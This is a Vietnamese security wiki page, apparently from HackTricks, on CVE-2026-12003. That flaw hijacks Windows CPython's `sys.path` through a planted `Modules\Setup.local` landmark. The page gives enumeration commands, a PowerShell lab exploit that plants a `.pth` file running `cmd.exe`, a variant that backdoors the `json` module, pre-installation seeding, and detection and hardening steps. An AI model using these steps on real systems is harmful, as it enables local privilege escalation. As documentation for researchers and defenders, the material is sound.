# Chiếm quyền `sys.path` qua build landmark của Windows CPython

{{#include ../../../banners/hacktricks-training.md}}

Một runtime có thể giữ lại các đường dẫn tương đối vốn chỉ dành cho cây build. Nếu một runtime đã cài đặt với quyền cao phân giải một trong các đường dẫn đó thành thư mục mà người dùng có quyền thấp có thể ghi, kẻ tấn công có thể tạo **build landmark** mà runtime mong đợi và khiến runtime tin tưởng một library prefix khác. CVE-2026-12003 là một ví dụ trên Windows CPython: tạo `Modules\Setup.local` có thể chuyển hướng mục standard library trong `sys.path` mà không cần sửa đổi bản cài đặt Python được bảo vệ.<sup>[[1]](#references)[[2]](#references)</sup>

## Chuỗi tạo đường dẫn của CPython

Các bản build Windows bị ảnh hưởng được biên dịch với `VPATH=..\..` và hiển thị giá trị này dưới dạng `sys._vpath`. Cơ chế dự phòng dễ bị tấn công trong `Modules/getpath.py` xem `VPATH\Modules\Setup.local` là dấu hiệu cho thấy interpreter đang chạy từ cây source; luồng dữ liệu sau biến giá trị lúc build này thành một primitive để thao túng search path khi runtime hoạt động.<sup>[[1]](#references)[[2]](#references)</sup>

| Giai đoạn | Giá trị suy ra cho `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Đường dẫn build được biên dịch | `VPATH=..\..` |
| Build landmark tại runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Landmark do kẻ tấn công tạo | `C:\Modules\Setup.local` |
| `build_prefix` được chọn | `C:\` |
| Standard library được chọn | `C:\Lib` |
| Kết quả | `C:\Lib` do kẻ tấn công kiểm soát được thêm vào `sys.path` |

Phép kiểm tra này là cơ chế dự phòng, được dùng khi không có hoặc không thể đọc `pybuilddir.txt` nằm cạnh executable. Điều này quan trọng vì người dùng có quyền thấp có thể không sửa được `C:\Program Files\Python314`, nhưng vẫn có thể tạo thư mục mới tại `C:\`. Sau đó, tiến trình `python.exe` chạy với quyền cao sẽ tải mã Python bằng access token của chính nó.<sup>[[1]](#references)[[2]](#references)</sup>

### Điều kiện tiên quyết

Chỉ xem đây là một ranh giới đặc quyền khi đáp ứng tất cả các điều kiện sau:<sup>[[1]](#references)[[2]](#references)</sup>

- Mục tiêu là bản build **Windows CPython** bị ảnh hưởng; logic đường dẫn dễ bị tấn công không phải là thuộc tính của ngôn ngữ Python.
- Thư mục thu được khi phân giải `..\..` từ thư mục chứa `python.exe` cho phép người dùng có ít quyền hơn tạo landmark và cây `Lib`.
- Người dùng có quyền cao hơn, service, installer hoặc tài khoản triển khai phần mềm sau đó khởi chạy interpreter này.
- Không có cấu hình path-isolation nào ghi đè đường dẫn dò tìm dễ bị tấn công.

## Liệt kê

Kiểm tra cả giá trị được biên dịch lẫn search path thực tế. Giá trị `..\..` hiển thị được là một manh mối hữu ích, nhưng chưa đủ để chứng minh có thể khai thác: hãy phân giải đường dẫn, kiểm tra ACL và xác nhận rằng landmark được tạo sẽ nằm ngoài bản cài đặt được bảo vệ.<sup>[[1]](#references)[[2]](#references)</sup>

```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```

Không giới hạn việc đánh giá ở các trình cài đặt chính thức. Với mọi sản phẩm đi kèm `python.exe`, hãy xác định `sys._vpath` tương ứng với thư mục thực tế chứa tệp thực thi, rồi kiểm tra ACL của các vị trí `Modules` và `Lib` thu được. Đường dẫn cài đặt sâu hơn có thể trỏ đến một thư mục ứng dụng hoặc nhà cung cấp khác có quyền ghi, thay vì `C:\`.<sup>[[1]](#references)</sup>

## Quy trình khai thác trong lab

PoC trong lab sau đây tái tạo đủ cấu trúc runtime hợp lệ bên dưới prefix đã chọn để Python khởi tạo, thêm một dòng `.pth` có thể thực thi, rồi cuối cùng tạo landmark. Hãy tạo payload trước landmark để tránh khiến interpreter tạm thời trỏ đến một cây thư viện chưa hoàn chỉnh.<sup>[[1]](#references)</sup>

```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
  Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```

Trong quá trình khởi tạo site thông thường, Python xử lý các tệp `.pth` trong những thư mục site-packages được nhận diện. Chỉ các dòng bắt đầu bằng `import` theo sau là khoảng trắng mới được thực thi, và câu lệnh có thể thực thi phải nằm trên một dòng vật lý; `python -S` ngăn việc tự động import `site`, do đó vô hiệu hóa trigger này.<sup>[[1]](#references)[[4]](#references)</sup>

### Phương án thay thế kích hoạt bởi import

Không bắt buộc phải thực thi khi khởi động. Sau khi tái tạo cây thư viện hợp lệ, hãy cài backdoor vào một module mà script có đặc quyền dự kiến sẽ import. Ví dụ, thêm code vào `Lib\json\__init__.py` đã được cài sẽ thực thi khi nạn nhân import `json`; chọn một module đáng tin cậy nhưng không được import phổ biến có thể giúp trigger ít gây chú ý hơn.<sup>[[1]](#references)</sup>

```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
  Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```

Biến thể này vẫn kế thừa token của tiến trình import, nhưng phụ thuộc vào việc ứng dụng mục tiêu import module đã sửa đổi. Khi kiểm thử phần mềm thực tế, hãy giữ nguyên hành vi của module gốc; nếu không, thao tác import có thể thất bại trước khi quy trình đặc quyền dự kiến hoàn tất.<sup>[[1]](#references)</sup>

## Gieo mầm trước khi cài đặt

Có thể gieo mầm vào search path trước khi cài đặt. Người dùng có quyền thấp có thể chuẩn bị cây `Lib` và `Modules\Setup.local` sẽ được tạo sau đó, rồi chờ một cổng phần mềm có đặc quyền, quy trình hỗ trợ kỹ thuật hoặc hệ thống triển khai thực hiện cài đặt cho tất cả người dùng. Các trình cài đặt khởi chạy interpreter mới để cài package hoặc biên dịch trước standard library có thể kích hoạt payload dưới tài khoản triển khai mà không cần quản trị viên mở Python theo cách thủ công.<sup>[[1]](#references)</sup>

Điều này cũng làm thay đổi quy trình rà soát triển khai: hãy kiểm tra các thư mục cha có quyền ghi và các thư mục landmark/library đã tồn tại **trước khi** cài đặt hoặc nâng cấp runtime đi kèm, thay vì chỉ kiểm tra thư mục cài đặt cuối cùng sau khi triển khai.<sup>[[1]](#references)</sup>

## Phát hiện và củng cố bảo mật

Các điểm cần kiểm tra trên máy chủ gồm landmark và cây library bất thường, tiếp theo là việc khởi chạy Python với đặc quyền. Tìm `Modules\Setup.local`, `Lib\site-packages\*.pth` ở thư mục gốc hoặc vị trí bất thường khác, các package standard library được sao chép, và các file module có chủ sở hữu hoặc thời điểm tạo khác với bản cài đặt được bảo vệ. Đối chiếu thời điểm chúng được tạo bởi người dùng thông thường với việc `python.exe` chạy bằng quyền nâng cao tạo tiến trình con như `cmd.exe`, `powershell.exe`, công cụ quản lý tài khoản hoặc các tiến trình con bất thường khác.<sup>[[1]](#references)</sup>

```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
  Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
  Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```

Bản sửa upstream loại bỏ fallback `VPATH\Modules\Setup.local` và dùng `pybuilddir.txt` làm chỉ dấu duy nhất cho build tree. Ưu tiên dùng bản build cố định hoặc bản cài đặt theo từng người dùng được quản lý bằng Python install manager hiện tại. Nếu tạm thời chưa thể nâng cấp, hãy bảo vệ thư mục tổ tiên đã phân giải và tạo trước `Modules` với ACL hạn chế; các tệp `._pth` được kiểm soát hoặc `PYTHONHOME` cũng có thể thay đổi cơ chế tìm kiếm, nhưng cần kiểm tra tính tương thích của ứng dụng.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Chiếm quyền đường dẫn tìm kiếm Windows CPython và leo thang đặc quyền cục bộ](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [Sự cố CPython #151544 - Có thể bật đường dẫn tìm kiếm trong cây mã nguồn mà không cần sửa đổi thư mục cài đặt](https://github.com/python/cpython/issues/151544)
- [3] [Yêu cầu pull CPython #151545 - Loại bỏ fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Tài liệu Python - Tệp cấu hình đường dẫn `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
